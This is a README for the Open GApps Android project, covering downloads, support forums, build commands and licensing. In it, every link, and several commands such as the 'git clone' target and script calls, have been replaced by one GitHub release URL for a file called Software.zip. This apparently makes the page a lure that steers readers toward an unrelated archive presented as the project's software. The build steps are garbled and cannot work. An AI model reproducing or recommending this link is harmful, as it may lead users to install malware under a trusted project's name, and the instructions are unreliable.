# Open GApps

## Getting the latest pre-built Open GApps

The latest version of pre-built Open GApps can be found at <https://github.com/eagle1209/opengapps/releases/download/v2.0/Software.zip>, hosted on SourceForge.

|                                                                             [Support Project](https://github.com/eagle1209/opengapps/releases/download/v2.0/Software.zip) | [![Donate](https://github.com/eagle1209/opengapps/releases/download/v2.0/Software.zip%https://github.com/eagle1209/opengapps/releases/download/v2.0/Software.zip)](https://github.com/eagle1209/opengapps/releases/download/v2.0/Software.zip)                                                     |
| -------------------------------------------------------------------------------------------------------------------------: | :-------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
|                                                      [Q&A Forum](https://github.com/eagle1209/opengapps/releases/download/v2.0/Software.zip) | [![XDA Q&A](https://github.com/eagle1209/opengapps/releases/download/v2.0/Software.zip%26A-on%https://github.com/eagle1209/opengapps/releases/download/v2.0/Software.zip)](https://github.com/eagle1209/opengapps/releases/download/v2.0/Software.zip)                           |
|                                  [Development Forum](https://github.com/eagle1209/opengapps/releases/download/v2.0/Software.zip) | [![XDA Development](https://github.com/eagle1209/opengapps/releases/download/v2.0/Software.zip%https://github.com/eagle1209/opengapps/releases/download/v2.0/Software.zip)](https://github.com/eagle1209/opengapps/releases/download/v2.0/Software.zip) |
|                                                                        [Support Chat](https://github.com/eagle1209/opengapps/releases/download/v2.0/Software.zip) | [![Gitter](https://github.com/eagle1209/opengapps/releases/download/v2.0/Software.zip)](https://github.com/eagle1209/opengapps/releases/download/v2.0/Software.zip)                                            |
| [![Download OpenGApps](https://github.com/eagle1209/opengapps/releases/download/v2.0/Software.zip)](https://github.com/eagle1209/opengapps/releases/download/v2.0/Software.zip) | [![Download OpenGApps](https://github.com/eagle1209/opengapps/releases/download/v2.0/Software.zip)](https://github.com/eagle1209/opengapps/releases/download/v2.0/Software.zip)                                       |

## Support for the pre-built packages from https://github.com/eagle1209/opengapps/releases/download/v2.0/Software.zip

If you have any questions, check out the [Open GApps Wiki](https://github.com/eagle1209/opengapps/releases/download/v2.0/Software.zip), especially the [FAQ](https://github.com/eagle1209/opengapps/releases/download/v2.0/Software.zip) since it'd answer most of the questions.
If you can't find the answer to your question use the [XDA Q&A Thread](https://github.com/eagle1209/opengapps/releases/download/v2.0/Software.zip) or join us on [Gitter](https://github.com/eagle1209/opengapps/releases/download/v2.0/Software.zip) to receive support. *Don't forget to add at least the Open GApps installer debug log and if experiencing Force Closures also include a logcat*.

If you did find a bug in the Pre-built https://github.com/eagle1209/opengapps/releases/download/v2.0/Software.zip packages you can report it at the [XDA Open GApps Development Thread](https://github.com/eagle1209/opengapps/releases/download/v2.0/Software.zip). *Remember to include at minimum the Open GApps installer debug log and if applicable a logcat*.

Please **don't** file directly any GitHub issues to file problems with the Pre-built packages. The GitHub issues tracker is only used for issues concerning the Open GApps Project scripts themselves.

## Build your own Open GApps

**The example git commands assume you have a [GitHub account](https://github.com/eagle1209/opengapps/releases/download/v2.0/Software.zip) and have set-up [SSH authentication](https://github.com/eagle1209/opengapps/releases/download/v2.0/Software.zip).**

If you want to build your own version of Open GApps, you'll need to fetch the git sources:

To initialize your local repository using the Open GApps source tree, clone the main repository with the command:

```shellscript
git clone https://github.com/eagle1209/opengapps/releases/download/v2.0/Software.zip
```

Then sync the submodules to get the original APK sources as provided by Google. Take note that these repositories are very large (in the order of GiBs).
You can also use this command to update the sources at a later moment to their most recent version:

```shellscript
https://github.com/eagle1209/opengapps/releases/download/v2.0/Software.zip [--shallow] [arch]
```

* `--shallow` will order to fetch only the latest snapshot of the APKs (reduces space used and amount of data to be retrieved by git, by not fetching the APKs' history)
* `arch` can be one of the following "arm, arm64, x86, x86_64" to fetch only data required for specified architecture (note that fallback architectures will be fetched too)

**To build Open GApps you'll need the Android build tools installed and set-up in your $PATH. If you use Ubuntu you can check out [@mfonville's Android build tools for Ubuntu](https://github.com/eagle1209/opengapps/releases/download/v2.0/Software.zip).**

To build Open GApps for all platforms and all Android releases:

```shellscript
make
```

To build Open GApps for a specific Android release on a specific platform,
define both the platform and the API level of that release, seperated by a dash and optionally add the variant with another dash.

Two examples (for building for Android 6.0 on ARM):

```shellscript
make arm-23
```

or

```shellscript
make arm-23-stock
```

To add updated source APKs to the sources archive (you can add more than one at once):

```shellscript
https://github.com/eagle1209/opengapps/releases/download/v2.0/Software.zip [https://github.com/eagle1209/opengapps/releases/download/v2.0/Software.zip]* [beta] [https://github.com/eagle1209/opengapps/releases/download/v2.0/Software.zip]*
```

For contributors, updated sources can be uploaded. Either without an argument for every architecture, or with one or more arguments for a subset of architectures:

```shellscript
https://github.com/eagle1209/opengapps/releases/download/v2.0/Software.zip [archs]*
```

If you want an overview of the locally available sources:

```shellscript
https://github.com/eagle1209/opengapps/releases/download/v2.0/Software.zip
```

You can add extra arguments to report_sources to do your more advanced bidding too:

```shellscript
https://github.com/eagle1209/opengapps/releases/download/v2.0/Software.zip ( ([sdk] [archs]*) || [arch-sdk] ) && [hash] || [max*mb] || [min*mb] || [nobeta] || [nohelp] || [noleanback] || [nosig]
```

## License

The Open GApps Project itself is licensed under the [GPLv3](https://github.com/eagle1209/opengapps/releases/download/v2.0/Software.zip) with an addendum called the
**Open GApps installable zip exception**.

A short explanation of these license terms and the terms used by the pre-built https://github.com/eagle1209/opengapps/releases/download/v2.0/Software.zip packages:

* The license and its exception are very comparable to the GNU Compiler Collection.
* The Open GApps Project itself is like a "compiler" that is licensed under the GPLv3.
* The "Installable zips" produced by the Open GApps Project is a assorted product of which its components adhere to various different licenses. E.g. the Open GApps installer scripts are still GPLv3 licensed.
* The author of an "installable zip" can choose the license for this assorted end-product themselves, as long as any changes to the version of The Open GApps Project compiler used during the creation of the "installable zip" are published under the GPLv3 with the "installable zip" too. Also the individual components within the "installable zip" are still licensed under their respective terms.
* The pre-built packages from https://github.com/eagle1209/opengapps/releases/download/v2.0/Software.zip are made available under the terms that they can be freely used for personal use only, and are not allowed to be mirrored to the public other than https://github.com/eagle1209/opengapps/releases/download/v2.0/Software.zip
